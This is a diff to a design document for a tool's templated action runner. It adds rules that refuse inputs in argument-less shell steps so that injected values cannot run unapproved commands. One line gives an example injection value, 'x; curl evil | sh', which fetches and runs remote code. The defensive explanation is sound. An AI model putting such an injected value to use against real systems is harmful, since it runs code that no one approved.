@@ -74,6 +74,12 @@ Two copies would drift, and the copy an agent reads is the one that must be righ
 The Run menu preview, the approval dialog, and the trust fingerprint therefore all describe the *template*, so an input cannot introduce a command a human did not approve.
 Containment of a `cwd` naming an input is checked again after substitution, because it cannot be checked against a template.
 A value outside a `choice` input's options, an unknown input key, and a reference to an undeclared input are each refused rather than silently substituted empty.
+A `choice` input with no declared default takes its first option, because the empty string matches no option and would render a blank, unsubmittable prompt.
+
+**A `shell` step with no `args` may not carry an input, and the action does not load if it does.**
+That step's command string is passed to the shell untouched so repository-authored shell syntax keeps working, which means a substituted value would be shell syntax too: `command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"` runs a second command nobody approved.
+It is refused at discovery rather than quoted at run time, because quoting needs the shell dialect, which is not resolved until spawn, and a rule the author can see beats one they cannot.
+Every other location is already safe: a `process` step's argv reaches the OS verbatim, a `shell` step *with* args has its command and each argument quoted by `_shell_command_line`, and `cwd` and `env` are spawn fields rather than shell text.
 
 An action whose every step is for another platform is not shown, and says so as a diagnostic.
 That is what lets one action carry a Windows and a POSIX implementation instead of the repository holding two near-identical entries.
